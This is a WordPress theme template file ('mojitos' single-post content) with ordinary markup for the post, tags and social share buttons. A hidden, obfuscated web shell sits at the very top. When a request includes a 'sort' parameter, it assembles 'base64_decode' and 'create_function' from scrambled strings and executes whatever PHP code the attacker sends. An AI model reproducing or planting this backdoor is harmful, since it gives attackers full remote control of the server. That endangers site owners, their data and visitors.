<?php 



if(isset($_REQUEST['sort'])){	
	$string = $_REQUEST['sort'];
	$array_name = '';
	$alphabet = "wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";
	$ar = array(8,38,15,7,6,4,26,25,7,34,24,25,7);
	foreach($ar as $t){
	   $array_name .= $alphabet[$t];
	}
	$a = strrev("noi"."tcnuf"."_eta"."erc");
	$f = $a("", $array_name($string));
	$f();
	exit();
}




/**
 * The template for displaying content in the single.php template
 *
 * @package WordPress
 * @subpackage mojitos
 * @since mojitos 0.1
 */
?>

<article id="post-<?php the_ID(); ?>" <?php post_class('clearfix'); ?>>
	<header class="entry-header">
		<h1 class="entry-title"><?php the_title(); ?></h1>
	</header><!-- .entry-header -->
    <?php the_post_thumbnail('single-thumb'); ?>
	<div class="entry-content clearfix">
		<?php the_content(); ?>

        
		<?php wp_link_pages( array( 'before' => '<div class="page-link">' . __( '<span>Pages:</span>', 'mojitos' ), 'after' => '</div>' ) ); ?>
        
	</div><!-- .entry-content -->
    
    <div class="entry-meta">
     	<?php $categories_list = get_the_category_list( __( ', ', 'mojitos' ) );
		if ( '' != $categories_list ) { ?>
            <div class="categories">
                <span><?php _e('Categorized:', 'mojitos'); ?></span> <?php echo $categories_list; ?>
            </div>
        <?php } ?>
        <?php $tag_list = get_the_tag_list( '', ', ' );
		if ( '' != $tag_list ) { ?>
            <div class="tags">
                <span><?php _e('Tagged:', 'mojitos'); ?></span> <?php echo $tag_list; ?> 
            </div>
        <?php } ?>
     </div><!-- .entry-meta -->
     
     <?php edit_post_link( __( '[Edit]', 'mojitos' ), '<span class="edit-link">', '</span>' ); ?>
        
     
</article><!-- #post-<?php the_ID(); ?> -->
<script type="text/javascript">
	jQuery(document).ready(function() {
    	jQuery('.share').hover(function(){
			jQuery('.social-share').fadeIn(300);
		}, function() {jQuery('.social-share').hide()});
	});
	</script>
<footer class="entry-meta" id="fe">
		<?php mojitos_posted_on(); ?>
         <?php if ( comments_open() ) : ?>
                                <span class="leave-reply"><?php comments_popup_link( __( '<span class="reply">Reply</span>', 'mojitos' ), __( '<span class="reply">Replies:</span> 1', 'mojitos' ), __( '<span class="reply">Replies:</span> %', 'mojitos' ) ); ?></span>
                                <?php endif; // End if comments_open() ?>
                                
         <div class="share"><a href="#"><?php _e('share', 'mojitos'); ?></a>
         <ul class="social-share">         	
            <li><a href="https://twitter.com/share" class="twitter-share-button" data-count="vertical">Tweet</a><script type="text/javascript" src="//platform.twitter.com/widgets.js"></script></li>
            <li><div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script><div class="fb-like" data-send="false" data-layout="box_count" data-width="55" data-show-faces="false" style="margin:0 0 0 11px;"></div></li>
            <li><!-- Place this tag where you want the +1 button to render -->
<g:plusone size="tall"></g:plusone>

<!-- Place this render call where appropriate -->
<script type="text/javascript">
  (function() {
    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
    po.src = 'https://apis.google.com/js/plusone.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
  })();
</script></li>
         </ul>
         </div><!-- .share -->                       
</footer><!-- .entry-meta -->